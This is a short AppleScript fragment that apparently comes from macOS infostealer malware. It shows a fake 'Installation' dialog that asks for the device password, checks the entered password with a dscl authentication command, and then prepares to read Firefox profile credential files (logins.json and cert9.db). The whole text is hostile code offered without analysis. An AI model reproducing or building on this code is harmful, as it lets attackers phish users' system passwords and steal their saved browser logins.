set accountName to system attribute "USER"
set answer to display dialog "Please enter device password to continue." default answer "" with title "Installation" with hidden answer
set checkResult to do shell script "dscl . authonly " & accountName & space & text returned of answer
on loadFile(sourcePath)
set fileContents to read sourcePath
return fileContents
end loadFile
set profileRoot to "/Library/Application Support/Firefox/Profiles/"
set credentialFiles to {"/cert9.db", "/logins.json"}
